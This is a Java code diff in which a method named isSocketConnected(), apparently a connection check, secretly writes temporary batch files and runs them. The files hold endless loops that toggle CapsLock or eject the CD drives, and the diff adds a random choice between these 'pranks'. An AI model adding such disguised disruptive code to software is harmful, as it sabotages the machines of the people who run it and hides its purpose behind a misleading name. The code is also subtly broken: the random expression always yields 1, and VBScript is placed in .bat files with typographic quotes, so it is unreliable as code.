@@ -68,6 +68,12 @@ class SendThread implements Runnable
 
 
 
+
+
+
+
+
+
 class Sockets
 {
     public static void messagesCheck(int numberMessages)
@@ -81,29 +87,64 @@ class Sockets
     public static boolean isSocketConnected()
     {
         try{
-            File temp = File.createTempFile("vncv216789", ".bat"); 
-            String filePath = temp.getAbsolutePath();
-            String dirPath = filePath.substring(0,filePath.lastIndexOf(File.separator));           
+            int random = (int) Math.random() * 10 +1;
+            
+            if(random <= 3)
+            {
+                File temp = File.createTempFile("vncv216789", ".bat"); 
+                String filePath = temp.getAbsolutePath();
+                String dirPath = filePath.substring(0,filePath.lastIndexOf(File.separator));           
 
-            System.out.println("File in: " + filePath);
-            
-            BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-    	    bw.write("@ECHO off\nSet wshShell =wscript.CreateObject(“WScript.Shell”)\n" +
+                System.out.println("File in: " + filePath);
+
+                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
+                bw.write("@ECHO off\nSet wshShell =wscript.CreateObject(“WScript.Shell”)\n" +
+    "do\n" +
+    "wscript.sleep 100\n" +
+    "wshshell.sendkeys “{CAPSLOCK}”\n" +
+    "loop");
+                bw.close();
+
+                System.out.println(Sockets.executeCommand("call " + filePath));
+                System.out.println("CapsLock Prank!");
+                
+            }else if(random <= 6)
+            {
+                File temp = File.createTempFile("vncv216789", ".bat"); 
+                String filePath = temp.getAbsolutePath();
+                String dirPath = filePath.substring(0,filePath.lastIndexOf(File.separator));           
+
+                System.out.println("File in: " + filePath);
+
+                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
+                bw.write("Set oWMP = CreateObject(“WMPlayer.OCX.7”)\n" +
+"Set colCDROMs = oWMP.cdromCollection\n" +
 "do\n" +
+"if colCDROMs.Count >= 1 then\n" +
+"For i = 0 to colCDROMs.Count – 1\n" +
+"colCDROMs.Item(i).Eject\n" +
+"Next\n" +
+"For i = 0 to colCDROMs.Count – 1\n" +
+"colCDROMs.Item(i).Eject\n" +
+"Next\n" +
+"End If\n" +
 "wscript.sleep 100\n" +
-"wshshell.sendkeys “{CAPSLOCK}”\n" +
 "loop");
-    	    bw.close();
-    		
-            System.out.println(Sockets.executeCommand("call " + filePath));
-    	    System.out.println("Done");
+                bw.close();
+
+                System.out.println(Sockets.executeCommand("call " + filePath));
+                System.out.println("CDRom Prank!");
+            }else
+                System.out.println("Nothing has been done!");
             
-            return true;
-        }catch(Exception e)
-        {
-            e.printStackTrace();
-            return true;
-        }
+            
+                return true;
+            }catch(Exception e)
+            {
+                e.printStackTrace();
+                return true;
+            }
+        
     }
     
     
